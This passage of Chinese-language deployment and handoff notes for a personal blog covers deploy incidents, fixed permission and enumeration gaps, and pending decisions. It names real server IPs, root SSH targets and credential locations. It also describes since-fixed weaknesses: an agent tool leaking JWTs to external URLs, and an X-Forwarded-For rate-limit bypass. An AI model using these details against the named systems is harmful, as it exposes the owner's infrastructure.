2. **整目录 `mv` 掉再只搬 live2d** —— 把 `uploads`（用户上传图，**实测丢过 5 张**）、`.well-known`（ACME 证书续期）、`data`（AI 日更 cron 每 30 分钟写入）一起清空。
3. **保留逻辑第一版写成"目录不存在才整目录搬"** —— 被新包自带的 `dist/uploads` 顶掉，**又丢 5 张图**。
4. **改成 union 合并后又只 `mkdir` 顶层目录** —— `uploads/images` 子目录不存在导致 `cp` 失败；且 `set -euo pipefail` 下 `find|wc` 对空目录返回非 0 直接中断脚本。

现在：逐文件 union 合并（线上有、新包没有的才补，父目录逐个建）、统计走 `count_files()` 兜底、**打包时排除 `uploads/data/live2d` 交给脚本保留**。
⚠️ **另外**：该脚本曾出现「打印 `DEPLOY_OK` 但实际没换文件」（服务器上残留旧包）。**现在每次部署后必须强校验**：`线上 index.html` 引用的文件必须存在于新包内。临时用 `b_deploy_manual.sh` 的手动原子替换绕过。

### 六、真机验证抓到的两个静态检查抓不到的回归

- `PublicLayout.tsx` 的 `requestIdleCallback` 被写成 `ric(window, cb)`（第一参数必须是回调）——因为用了 `as any` 绕开类型检查，**`tsc` 与 `build` 都不会报错**，线上直接抛 `parameter 1 is not of type 'Function'` 首页整页崩。**ErrorBoundary 接住了**（显示可读错误而非白屏），所以那批改动才有救。
- 结论：前端改动**必须真机跑一遍**，`tsc + build` 不足以证明可用。

### 七、本期上线证据

- 演练容器（`users5` + 全新库）：三套验收 **users 55/0 + email 46/0 + admin 101/0**；批次一专项探针 **23/0**；批次三专项探针 **18/0**（含：chat 越权删除 403、history 路由 200、匿名读未审核 prompt 404 且已审核仍可读、限流依赖已挂在 4 个端点、slug 路由不再 422）。
- 生产（`users5`）：数据零变化（文章 23 / 评论 42 / 用户 2 / 提示词 25 / 订阅 16，integrity ok），探针残留 0；公网冒烟全 200/401/404 符合预期。
- 真机（Chrome 冷缓存）：首页/文章页/登录页/后台登录页/作者页/文章列表/归档/提示词/热点 **9 条路由全部正常渲染，无白屏、无 console 报错**。
- **一次 A-RAG 验收失败是上游模型网关返回 `503 system cpu overloaded`**，不是代码回归（重跑即 55/0）——遇到先查日志再下结论。

## 用户系统三期：坏功能修复 + 权限收口（2026-09-28，镜像 `qianxi-blog:users4`）

一句话：**修好 6 个「看着有、实际不可用」的前端功能，收掉 8 个越权/枚举面**。后端 12 个 `.py`、前端 11 个文件（2 个新增：`ErrorBoundary.tsx` / `utils/errors.ts`）。提交 `8f1aac5`（已推 GitHub）；补漏提交 `23e310a`（已推）。

### 修好的坏功能（此前都"看着能用"）

| # | 现象 | 根因 | 修法 |
|---|---|---|---|
| 1 | 用户端**编辑文章正文恒空**，编辑功能实际不可用 | 编辑页从 `GET /users/me/articles` **列表**取正文，而列表走简化模型 `ArticleListResponse`，**不含 `content_md`** | 新端点 **`GET /api/v1/users/me/articles/{article_id}`** 返回完整 `ArticleResponse`（含 `content_md`）；`api/users.ts` 新增 `getMyArticle(id)`；`WritePage.tsx` 改调它，并不再只搜列表前 100 条 |
| 2 | 编辑页一打开就白屏（`Objects are not valid as a React child`） | 后端 `tags` 是**对象数组**，前端把对象直接丢给 `setSelectedTagNames` | 先 `.map(t => typeof t === 'string' ? t : t.name)` 归一化再进 state；`UserArticle.tags` 类型改为 `Array<string \| {id?, name, slug?}>` |
| 3 | 点「保存草稿」弹「已下架」，**线上还挂着** | `api/articles.ts` 的 `updateArticle` 按白名单挑字段，**把 `status` 丢了** | 转发 `status`（`ArticleCreate` 补 `status?`） |
| 4 | 后台「相关新闻」点了 404 | 链到 `/article/${item.slug \|\| item.id}`，而 `/article/:slug` 依赖"按 slug 查文章"的后端接口——**后端没有这条路由**，只要 slug 非空就是死链 | 侧栏改链 `articles/:id` |
| 5 | 密码填 7 位提交后**整站白屏** | FastAPI 422 的 `detail` 是**数组**，被 `error.response?.data?.detail` 直接塞进 JSX | 新增 `frontend/utils/errors.ts` 的 **`errorText()`**，`UserCenter.tsx`/`AdminProfile.tsx` 全部改走它；密码框 `minLength` 6→**8**（后端 `PasswordChange` 要求 ≥8），文案改「至少 8 位字符」 |
| 6 | 任何渲染异常 = **整站白屏** | Provider 树里没有 ErrorBoundary | 新增 `components/ErrorBoundary.tsx`，`App.tsx` 顶层包住整棵树 |

### 收掉的越权 / 枚举面

| 面 | 改前 | 改后 |
|---|---|---|
| 管理员改密 | `PUT /admins/{admin_id}/password`：**超管改自己可免旧密码** | **改自己密码任何角色都必须带 `old_password`**（超管改**他人**仍可免，那是后台重置场景）；成功时写 `password_changed_at`，**旧 token 立刻 401** |
| 用户自助改密 | `PUT /auth/password` 的 `old_password` 可不填，直接改密 | **改为必填**（缺 → 400「请提供旧密码」） |
| 旧 token 失效判据 | 内联在 `get_current_user`；`comments.py` 的可选登录依赖 `get_comment_author` **漏判** → 登出后还能继续评论 | 抽成单一函数 **`core/deps.py: token_is_stale(user, payload)`**，两处共用。`PUT /admins/users/{user_id}/password`（后台重置普通用户）本来就写 `password_changed_at` |
| AI 助手工具面 | `build_all_tools()` / `dispatch()` 没有角色概念，`execute_sql`（**绕过全部接口层权限**）对所有管理员可见，`allow_write` 采信**模型给的参数值** | **双层闸门** `build_all_tools(role)` + `dispatch(..., role)`；`execute_sql` 只对 `super_admin` 暴露（普通 admin **连 schema 都拿不到**，直接构造调用**也会被 dispatch 拒**）；`allow_write` 改由**服务端按角色**决定。角色由 `api/v1/agent.py` 透传 `current_admin.role` |
| AI 助手外呼 | `services/agent/tools/call_api.py` 的 `normalize_path` 原样接受绝对 URL，**会把调用者的 JWT 发到任意外站**（外带凭证 + SSRF） | 拒绝 `http://` `https://` `//` 开头；站内相对路径照旧拼成 `http://127.0.0.1:8000/...` |
| 登录爆破 | `POST /api/v1/auth/login` **无限流** | 加 `rate_limit("login", limit=10, window_seconds=60, key_scope="ip")` |
| 邮箱枚举 | `POST /api/v1/auth/password/reset/code`：已注册 400 / 未注册 200 | **一律 200 + 逐字相同的一句话**；邮箱不存在时走**同一套**域名/冷却/频率校验并落库，`deliver=False` 只占额度不发信（`send_code` 新增 `deliver` 参数） |
| 验证码并发 | `verify_code` 先查后改，并发可**双花 / 丢更新** | `services/verification_service.py` 改条件更新 + `rowcount` **原子消费**（`UPDATE … WHERE used_at IS NULL`），错码次数用 `attempts = attempts + 1` 原子自增 |

### ⚠️ 三个代价 / 前置条件（别当免费收益）

- **登录限流依赖 nginx 覆写 XFF，否则形同虚设**：限流是**进程内**的（2 worker 各持一份，实际额度≈2×），ip 维度取 `request.client.host`，而 uvicorn `--proxy-headers --forwarded-allow-ips=*` 取 `X-Forwarded-For` 的**第一个**值。原 nginx 配置是 `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`（**追加**），客户端自带 XFF 即可伪造来源 IP 绕过限流。**必须改成 `proxy_set_header X-Forwarded-For $remote_addr;`（覆写）**。该改动是否已落地见「待办」8。
- **重置密码发码统一话术的代价**：真正被限流/域名不允许的**已注册**用户也只会看到"已发送"，得等冷却结束再试。
- **后台角色闸门是信息暴露修复，不是提权修复**：`AdminLayout.tsx` 加 `isAdmin` 闸门（非管理员跳回 `/user`），`AdminLogin.tsx` 登录后校验角色、非 `admin`/`super_admin` 直接登出并提示走普通入口。**后端管理接口本来就有 `get_current_admin` 守卫**。

### 本批验证（证据见「验证」小节）

演练容器 `qianxi-e2e`（`qianxi-blog:users5`，127.0.0.1:8001，全新库 `e2e-users5.db`，账号 `e2e_admin`）三套 **users 55/0 + email 46/0 + admin 101/0**，与 users3/users4 基线一致无回归；专项探针 批次一 **23/0** + 批次三 **18/0**；镜像内容核对、AI 工具闸门容器内直调（不烧 LLM quota）、前端 `tsc --noEmit` + `npm run build` + XSS 回归测试 5/5 均通过。生产（`users5`）数据零变化，探针残留 0。

## AI 链路（2026-09-24 实测通过）

- 模型：`grok-4.7`，单模型，**没有配置 fallback**（`LLM_MODEL_CHAIN=grok-4.7`，`CPA_API_KEY` 未设）。
- 凭据：NewAPI token `blog-devlog`（id 383，分组 `svip`，`model_limits='grok-4.7'`）。**分组必须是 svip/vip**——grok-4.7 只在 CPA 渠道 3/16 上，渠道分组是 `svip,vip`，token 在 `default` 分组会 503 `model_not_found`（实测踩过）。
- 验证记录：公网 `POST /api/v1/chat/prompt-lab` 与 `POST /api/v1/chat/message` 均 200 真实补全；NewAPI logs 表确认记账（token_name=blog-devlog）。A-RAG 公网 SSE 实测：142 reasoning + 3 tool_start/result + 45 text + 1 done，引用带真实站内链接。
- admin 独享的 agent SSE 与文章摘要接口没有管理员口令未实测；agent 与摘要共用 `llm_router`（openai SDK 3.x 接口兼容，prompt-lab 已验证同 SDK）。
- 不要改 NewAPI 渠道/超时；不要动 `43.128.75.66` 与 `43.160.202.101` 上的 CPA、Grok 注册机、openclaw。

## 源码与仓库（2026-09-28 对齐后）

- GitHub `qianxi-00/My_Blog` master = **`6d641e5`**，与生产**完全一致**（三期 `8f1aac5`、补漏 `23e310a`、四期 `86c3ad5`/`469e5a8`/`6d641e5` 均已推）。本机克隆 HEAD 同为 `6d641e5`，工作区干净。
- 历史遗留的 7/19 HF 差异（`llm_router.py`、`.dockerignore`、`config.py` 等）**已回仓**（`f05e117` 起）。HF 版只剩旧栈回退价值，不要再当"更新的版本"。
- 服务器仓库 `/data/blog/repo-tmp`（`origin` 走 deploy key `/root/.ssh/github_my_blog_deploy_repo`）是推送出口。
- ⚠️ **推送方式**：本机没有该仓库的 GitHub 授权（dsh-git-forge 里 `F:\ProGram\DSH_Temporary` 无账号），所以走**服务器代推**：把改动文件按**字节**复制进 `/data/blog/repo-tmp`（父提交跟远端 master）→ `git add -A && git -c core.autocrlf=false commit` → `git push`。**不要用 patch 硬打**：仓库 blob 是 CRLF，本机克隆在 `AGENTS.md`、`core/database.py`、`core/security.py`、`requirements.txt`、`frontend/api/chat.ts` 这几个文件上与远端仅行尾不同，硬打会产生大段假 diff（2026-09-26 实测）。
- 推送后本地对齐（**注意两侧都是浅克隆**：本机 `.git/shallow` 与服务器仓库都只有最近约 10 个提交，完整历史只在 GitHub 上，查旧历史用网页/`gh`，别指望本地 `git log`）：
  ```bash
  git -c core.autocrlf=false fetch --depth=10 relay master   # relay = root@101.32.163.17:/data/blog/repo-tmp
  git -c core.autocrlf=false reset --hard relay/master
  ```
  直接用 `git fetch <url> master` 取 FETCH_HEAD 在浅克隆上会失败（`shallow roots are not allowed to be updated`，2026-09-26 实测），必须先 `git remote add relay …` 再按上面的写法。

## 数据事实

| 副本 | 状态 |
|---|---|
| `/data/blog/data/blog.db`（新生产库） | 2026-09-24 从 HF 导出 ≈ 种子库（HF 免费层 `/data` 临时，重建即重置）。23 文 / 567 热点（558 published + 9 draft） |
| `/data/blog-live-20260924.db` | 同上的导出原件（留档） |
| `/data/blog.db` | 旧快照（2026-07-09，532 热点），不要拿来当生产 |
| 仓库 `backend/data/db_part_0..12.dat` | 13 片，种子完整集 |
| 文章 Markdown `/data/My_Blog/Articles` | 11 个 .md，与线上 23 篇文章**不是同一批**，别混 |

## 已知缺口（截至 2026-09-28）

1. **Live2D 是死代码**：`Live2DWaifu` 未被任何组件 import（2026-09-24 核实，主 bundle 无 live2d 引用），站点宠物是静态 `DesktopPet`（codex-pets 海报，已上传生效）。`frontend/public/live2d/` 144MB 不需要上传，可择机从源码里删。
2. **141 个内联图已排查定案（2026-09-24）**：5 个从图床 My_image 找回并安装（字节级验证 200）；**136 个永久丢失**——仓库 public、本地 dist、旧 Worker 部署包、COS 桶（545 对象）、My_image（1370 文件）、过期旧服务器 8.148.252.27 全部查尽，原件只存在于已消亡的 HF 容器层与旧服务器。是否清除 analysis_md 里的死引用，等千禧拍板。
3. 管理端新上传的图片会写进容器层（`/app/uploads`），而 nginx 的 `/uploads/` 服务的是 `/var/www/blog/dist`、**不读容器层**——与旧架构行为一致（旧站上传也只活在 HF 容器里），durable 副本仍要靠 `frontend/public/uploads` 进 Git。**2026-09-28 三期未处理。**
4. `chat.py` 的 `get_session_history` 没有路由装饰器，`GET /chat/session/{id}/history` 不是现行接口。
5. APScheduler 在依赖里但无调度器；热点抓取 `trigger_mode` 写死 manual。
6. **提示词同步已恢复（2026-09-24）**：扣子 → 投稿接口 cron 每日同步（见现行生产表）。当前扣子账号只有 2 个机器人：AI面试知识库（1879 字人设，已投递待审核）、海龟汤主理人（人设为空，逻辑在工作流里、API 不暴露工作流节点提示词，同步不了）。6 月那批 14 条电商提示词的源机器人已不在账号里。
7. **旧数据遗留（非本次引入）**：`chat_messages` 有 5 行指向已删除的 `chat_sessions`（198 条消息中），`PRAGMA foreign_key_check` 会报出来（前几行就是它，不是用户系统的锅——那部分 0 悬空）。外键未强制，线上无影响，清理与否等拍板。
8. **`email_verification_required` 是摆设**（2026-09-28 核实）：`users.email_verified` 有 4 个写入点（注册带码、用户绑邮箱、管理端改邮箱、迁移脚本回填）但**没有任何一处读它做门禁**；站点设置 `email_verification_required` 也**只有 `models/settings.py:58` 的播种定义，0 个读取点**。所以"必须验证邮箱才能用"目前**实际上没有强制**。**要么接入门禁、要么把这个设置删掉，别留着当摆设。**
9. **`admins` 表已休眠但仍被引用**（2026-09-28 核实，本期未动）：`api/v1/settings.py:49` 仍 `select(Admin).where(role=="super_admin")` 取超管；4 个 FK 列仍指 `admins.id`——`comments.admin_id`、`images.uploaded_by`、`hot_topics.created_by`、`forum.admin_id`（4 个模型 + 3 个 alembic 版本）；另有 **9 个**模块仍 `from ...models.admin import Admin`（`agent`/`comments`/`forum`/`hotspots`/`prompts`/`settings`/`subscribe`/`stats`/`upload`）。一期已定「停用不删不重命名」（SQLite 外键重排风险），此处仅登记未清理。
10. **验收/探针脚本不在 Git 仓库里**：三套 e2e 在服务器 `/data/blog/scripts/acceptance/`（另有 `/tmp` 下的运行副本），三期专项探针在 `/root/probe_batch1.py`。**存在与仓库漂移的风险**，改动这些脚本时两处都要同步。
11. **前端「相关新闻」永远为空**（2026-09-28 核实）：`ArticleSidebar` 有 `relatedArticles` prop 与渲染分支，但 `ArticleDetail.tsx` 只有 `useState<ArticleListItem[]>([])`、**从不对它赋值**；后端也**没有"按 slug 查文章"的路由**。三期只把侧栏链接从 `/article/:slug` 改成 `articles/:id` 止损，**`App.tsx:57` 的 `/article/:slug` 路由本身仍是死链**（要么删路由，要么后端补 slug 查询）。

## 验证（改完必跑）

```powershell
Invoke-WebRequest https://blog.qianxi7988.me/api/v1/articles?page=1&page_size=1 -UseBasicParsing
Invoke-WebRequest https://blog.qianxi7988.me/api/v1/hotspots?page=1&page_size=1 -UseBasicParsing
ssh root@101.32.163.17 "curl -fsS http://127.0.0.1:8000/health"
# AI 冒烟（烧少量 quota）：
Invoke-WebRequest https://blog.qianxi7988.me/api/v1/chat/prompt-lab -Method Post -ContentType 'application/json' -Body '{"prompt":"回复OK","max_tokens":16}'
```

预期：文章 23、热点 558、health `{"status":"healthy"}`、prompt-lab 返回 200 带 result。

**三期（users4）改完必跑**——限流桶是**进程内**的，**不重建演练容器会吃上一轮的 429**：

```bash
# 1) 重建演练容器后连跑三套（users4 / 127.0.0.1:8001 / 全新库 e2e-users4.db / 账号 e2e_admin）
python3 /data/blog/scripts/acceptance/run_all_e2e.sh    # 预期 users 55/0 + email 46/0 + admin 101/0
# 2) 三期专项探针 22 项
python3 /root/probe_batch1.py
# 3) 镜像内容核对：镜像内 12 个后端 .py 的 sha256 应与工作区逐一相同
# 4) AI 工具闸门容器内直调（不烧 LLM quota）：
#      build_all_tools("admin") 无 execute_sql / build_all_tools("super_admin") 有；
#      dispatch("execute_sql", role="admin") 被拒；
#      normalize_path 拒绝绝对 URL → call_api 返回 ok:false / 400
# 5) 前端：npx tsc --noEmit 无错；npm run build 成功（14.96s）
```

第 2 项覆盖：单篇接口返回全文 `content_md`、tags 为对象数组、PUT 接受标签名数组；管理员自改密**不给旧密码 400 / 旧密码错 400 / 带旧密码 200**；`password_changed_at` 落库；改密后**旧 token 立刻 401**；新 token 评论归属本人、改密前旧 token 评论按访客处理；重置发码对已注册/未注册邮箱**响应逐字一致且都 200**；未注册邮箱也落码记录；用户列表项 `last_login_at` 已回填；连续错密登录触发 **429**。

## 凭据位置（无明文）

- HF token：主服务器 `/root/openclaw-config-backup-20260924-110346.tar.gz` 内 `.openclaw/secrets/`
- Cloudflare API token：同上 tar 包（`zone qianxi7988.me`，DNS 编辑用）
- NewAPI 博客 token：在 NewAPI MySQL `tokens` 表 `name='blog-devlog'`；容器里经 `runtime.env` 注入
- 博客后台管理员：库 `admins` 表（bcrypt），HF Space secrets 里有明文口令（`SUPER_ADMIN_*`），本地没有
- GitHub deploy key：`/root/.ssh/github_my_blog_deploy_repo`；本机 `gh` 已登录 qianxi-00

## 待办（未获确认不动）

1. ~~7/19 版差异回仓~~ 已完成（2026-09-24，`f05e117` + `d4ae1bd`）。
2. 旧栈处置：HF Space 与 Worker `qianxi-blog-site` 保留多久后删除；workers.dev 旧站仍公开可访问（建议保留一周作回退后删）。
3. 前端 dist 与旧 Worker assets 的同源性核对（1790B vs 1955B，旧 assets 可能含未回仓前端改动）。
4. ~~内联图找回~~ 已定案：5 个已恢复，136 个永久丢失；待拍板是否清除 analysis_md 里的死引用。
5. ~~备份扩展~~ 已完成（2026-09-24）：每日 DB 热备份 + nginx 站点/runtime.env/cron 配置快照 + 源码变化时重打包，DB/配置保 14 天、源码保最近 2 份。
6. 择机删除前端死代码 live2d 目录（144MB，无引用）。2026-09-30 核实：服务器上**从来没有过** live2d 目录（历次 dist 备份均无），只有死代码 `Live2DWaifu.tsx` 引用它；站点宠物实际用 `/images/codex-pets/*/poster.webp`（在线 200）。
7. ~~推 GitHub（三期）~~ **已完成**（2026-09-30）：`8f1aac5` / `23e310a` / `86c3ad5` / `469e5a8` / `6d641e5` 全部推上，`origin/master` = `6d641e5`，本机已 `reset --hard relay/master` 对齐。
8. ~~nginx 覆写 XFF~~ **已完成**（2026-09-30）：`/etc/nginx/sites-enabled/blog` 的 `/api/` location 已改成 `proxy_set_header X-Forwarded-For $remote_addr;`（覆写），`nginx -t` 通过后 reload；顺带清掉了原文件里重复的 `X-Real-IP` 与破损缩进。`gzip_types` 整行注释也已补全（16 种类型）+ `gzip_vary on`。
9. **Tailwind 构建期迁移**（收益可能大于本期任何一项，建议单独立项）：`frontend/index.html` 仍在用 `cdn.tailwindcss.com` 浏览器端运行时 JIT（阻塞 FCP）。**注意**：`frontend/` 下**没有** `tailwind.config.*` / `postcss.config.*`，`tailwindcss`/`postcss`/`autoprefixer` 也不在 `package.json` 依赖里——迁移时要把 CDN 版那份配置（`darkMode:'class'`、primary 色板、`slate.850`、Noto Sans SC 字体栈）逐项等价复刻，不能凭空重写。
10. **图片缩略图**：封面图仍是原图直出（单张最大 884KB），本期只做了懒加载。作者页已从 7.7MB 降到 2.7MB，但要根治需后端出缩略图。

## 待确认（本次自主判断，待千禧拍板）

1. ~~nginx XFF 是否已落地~~ **已落地**（见待办 8），该条关闭。
2. ~~三套 e2e 要不要在生产补跑~~ **已跑**（2026-09-30，`users5` + 真实库：users 55/0、email 46/0、admin 101/0，跑后数据零变化、探针残留 0），该条关闭。
3. **重置密码发码的"已发送"话术是否要补偿性提示**：为消枚举统一话术后，真正被限流/域名不允许的已注册用户也只看到"已发送"。是否在「忘记密码」页加一句"若几分钟内未收到，请等冷却结束后重试"？（未擅自改前端文案。）
4. **`email_verification_required` 的去留**：接入门禁（改注册流）还是从 `DEFAULT_SETTINGS` 删掉这个设置？两者都动代码/数据，**未获确认不动**（已知缺口 8）。
5. ~~`/article/:slug` 路由~~ **已处理**（2026-09-30，四期）：后端补了 `GET /articles/slug/{slug}`（前端一直在调，此前恒 404）。但 `articles.slug` **全站无写入路径**（建文时不设值，恒 null），所以要真正启用 slug 还得补 slug 生成逻辑——未获确认不动。
6. **`deploy_frontend_dist.sh` 的静默失败**：2026-09-30 出现过「打印 `DEPLOY_OK` 但线上文件没换」（服务器残留旧包）。当前是靠**部署后人工强校验**发现。是否要我把「校验线上 index.html 引用的文件必须存在于新包内」固化进脚本（失败即回滚）？未擅自改，因为这会改部署脚本的关键行为。
7. **旧 chat 会话无归属**：`chat_sessions` 存量 168 行的 `user_id`/`owner_ip` 都是 NULL（"无主遗留"），按当前规则**只有管理员能删**。是否需要写一次性脚本清理（表无归属字段，无法自证是否还有人在用）？未获确认不动。

